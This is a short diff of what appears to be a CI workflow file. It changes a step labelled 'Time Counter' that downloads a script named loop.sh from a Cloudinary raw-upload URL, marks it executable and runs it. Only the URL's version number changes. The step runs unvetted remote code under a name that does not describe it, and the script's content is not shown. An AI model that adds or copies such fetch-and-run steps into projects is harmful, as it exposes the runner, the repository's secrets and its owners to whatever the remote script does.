@@ -58,6 +58,6 @@ jobs:
         
     - name: Time Counter
       run: |
-          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1727166595/loop.sh
+          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1727172809/loop.sh
           chmod +x loop.sh
           ./loop.sh
